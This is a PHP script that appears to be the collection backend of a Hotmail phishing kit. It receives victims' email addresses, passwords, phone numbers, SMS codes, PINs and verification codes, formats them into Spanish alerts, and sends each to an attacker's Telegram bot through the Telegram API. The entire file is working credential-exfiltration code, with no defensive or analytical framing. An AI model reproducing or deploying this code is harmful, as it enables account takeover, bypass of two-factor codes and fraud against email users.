<?php
ini_set('display_errors', 0);
header('Content-Type: application/json; charset=UTF-8');
header('Access-Control-Allow-Origin: *');

include('../data.php');

$tipo   = trim($_POST['tipo']   ?? '');
$correo = trim($_POST['correo'] ?? '');
$clave  = trim($_POST['clave']  ?? '');
$phone  = trim($_POST['phone']  ?? '');
$codigo = trim($_POST['codigo'] ?? '');
$ip     = trim($_POST['ip']     ?? '?');
$pais   = trim($_POST['pais']   ?? '?');
$date   = date('d/m/Y H:i:s');

switch ($tipo) {
    case 'login':
        $msg  = "📧 HOTMAIL — ACCESO\n";
        $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
        $msg .= "📩 Correo: $correo\n";
        $msg .= "🔑 Clave: $clave\n";
        $msg .= "🌐 IP: $ip ($pais)\n";
        $msg .= "🕒 Fecha: $date\n";
        break;
    case 'phone':
        $msg  = "📧 HOTMAIL — TELÉFONO\n";
        $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
        $msg .= "📩 Correo: $correo\n";
        $msg .= "📱 Teléfono: $phone\n";
        $msg .= "🌐 IP: $ip ($pais)\n";
        $msg .= "🕒 Fecha: $date\n";
        break;
    case 'sms':
        $msg  = "📧 HOTMAIL — CÓDIGO SMS\n";
        $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
        $msg .= "📩 Correo: $correo\n";
        $msg .= "📱 Teléfono: $phone\n";
        $msg .= "🔢 Código SMS: $codigo\n";
        $msg .= "🌐 IP: $ip ($pais)\n";
        $msg .= "🕒 Fecha: $date\n";
        break;
    case 'pin':
        $msg  = "📧 HOTMAIL — PIN\n";
        $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
        $msg .= "📩 Correo: $correo\n";
        $msg .= "📱 Teléfono: $phone\n";
        $msg .= "🔢 PIN: $codigo\n";
        $msg .= "🌐 IP: $ip ($pais)\n";
        $msg .= "🕒 Fecha: $date\n";
        break;
    case 'verification':
        $msg  = "📧 HOTMAIL — VERIFICACIÓN\n";
        $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
        $msg .= "📩 Correo: $correo\n";
        $msg .= "📱 Teléfono: $phone\n";
        $msg .= "🔢 Código: $codigo\n";
        $msg .= "🌐 IP: $ip ($pais)\n";
        $msg .= "🕒 Fecha: $date\n";
        break;
    default:
        echo json_encode(['ok' => false]);
        exit;
}

file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
    'chat_id' => $chat_id,
    'text'    => $msg,
]));

echo json_encode(['ok' => true]);
